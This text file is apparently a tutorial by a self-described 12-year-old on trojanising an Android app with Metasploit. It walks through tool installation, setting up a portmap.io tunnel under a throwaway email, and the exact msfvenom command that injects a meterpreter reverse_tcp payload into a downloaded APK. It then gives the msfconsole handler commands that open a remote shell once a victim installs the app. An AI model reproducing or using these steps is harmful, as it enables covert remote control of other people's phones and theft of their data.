I AM ANSH, A 12 YEARS OLD BOY:)
                                 BEFOR STARTING ALL PROCESS READ THE FULL TXT FILE FIRST OTHERWISE FFFFFF..

YOU WILL GET ALL REQUIRED FILES IN MY GITHUB REPOSITORY...


METASPLOIT FOR ANDROID 14 , 15 AND 16


FOLLOW THE STEPS TO DO IT

1.         CLONE THE WHOLE FILE USING GIT CLONE (LINK......) 



2.    DOWNLOAD THESE FILES :) APKTOOL APKSIGNER JASIGNER KEYTOOL ZIPALIGN ANDROID SDK.......



3.     IF YOU GET EXTERNALLY MANAGED ENV. ERROR THEN TYPE        python -m venv myenv  ACTIVATE IT USING  source myenv/bin/activate



4.     NOW ZIPALIGN ERROR OF ...................D2EV THEN TYPE FIRST    sudo apt --purge remove zipalign  THEN sudo nano /etc/apt/sources.list    THEN    ON SECOND           LINE YOU WILL GET A LINK OF DEBIAN     SO   WRITE ON THIRD LINE
                                                       deb http://ftp.de.debian.org/debian buster main   

                     SAVE THE FILE USING CTRL+X  , Y  THEN ENTER 
               
                                              TYPE NOW sudo apt update

      THEN TYPE sudo nano /etc/apt/sources.list    THEN PUT A HASH ON THE STARTING OF THE SECOND LINE AFTER THAT IT WILL LOKK LIKE THIS:)#deb http://http.kali.org..............etc....


    THEN PRESS CTRL+X , Y , ENTER BUTTON  

THEN TYPE sudo apt install zipalign   IT WILL INSTALL ZIPALIGN FROM THAT WEBSITE WE HAVE WRITTEN...

AFTER THAT TYPE sudo nano /etc/apt/sources.list    THEN REMOVE HASH FROM THE SECOND LINE AND PRESS CTRL+X , Y , ENTER BUTTON.


OK..

5.   NOW INSTALL APKTOOL .. DOWNLOAD THE APKTOOL.JAR FILE FROM MY GITHUB THEN TYPE sudo nano wrapper.script or the txt file name of apktool given there with it .


     COPY ALL THE THINGS WRITTEN THERE AND MAKE A TXT FILE ON DESKTOP NAMED apktool AND PASTE THE WRITTINGS ON IT.. AND SAVE IT..

     MOVE apktool.jar also in desktop  AND THEN TYPE cd Desktop THEN sudo mv apktool apktool.jar /usr/local/bin

     NOW TYPE cd /usr/local/bin AND THEN TYPE ls THEN chmod +x * 


     OK....  


6.   INSTALL JDK 11 

7.   INSTALL  APKSIGNER USING  sudo apt install apksigner 

8.   INSTALL ANDROID SDK USING sudo apt install android sdk.

9.   OPEN A TEMP EMAIL WEBSITE AND LOGIN THROUGH IT ON PORTMAP.IO AND MAKE A OVPN FILE SO WHEN YOU LOGIN THEN YOU WILL SEE A CREATE NEW CONFIGURATION OPTION CLICK ON  
    
      CLICK ON IT THEN TYPE NAME AND ON PROTO SELECT TCP THEN CLICK ON GENERATE AND THEN CLICK ON DOWNLOAD IT WILL DOWNLOAD AN OVPN FILE 


10.  ON UP CLICK ON MAPPING RULES THEN CREATE ONE AND SELECT OPENVPN/TCP THERE AND YOU WILL GET IT ..

11.  WHEN GENERATING PAYLOAD USING MSFVENOM MAKE SURE THIS THINGS  :) YOU ARE IN SUDO SU MODE.
                                                                      YOU ARE IN THAT DIRECTORY WHERE YOU VE YOUR DOWNLOADED APK. 
12.   TYPE THIS WHILE GENERATING APK :) msfvenom -x <your file name means downloaded apk name > --arch dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=<your ip of portmap.io you will get this at ovpn generating time just see the code default is 193.161.193.99 > LPORT=<port no you will get in mapping time like 89485 it will be of 5 digit no 4 > -o <your output file name>..

13.    open msfconsole in sudo mode 

14.     TYPE use exploit/multi/handler

15.     TYPE set payload android/meterpreter/reverse_tcp

16.     TYPE set LHOST 0.0.0.0                                                 <DONT GIVE IP JUST GIVE AS I HAVE WRITTEN>

17.      TYPE set LPORT <your port of listening given in mapping rule last like 6666 and in time of making maping rule just type the port any in the section of port>


18.     TYPE exploit <before this just click on wifi option at top of kali and select configure vpn then go down select import a new one then click on create then select our ovpn file then ok then again click on wifi option and then select our vpn then it will connect after that on msfconsole click enter on exploit


19.     WHEN IT WILL START HANDLER INSTALL APK AND DONEEEE.... 
     

                                                -----------THANKS---------------------------

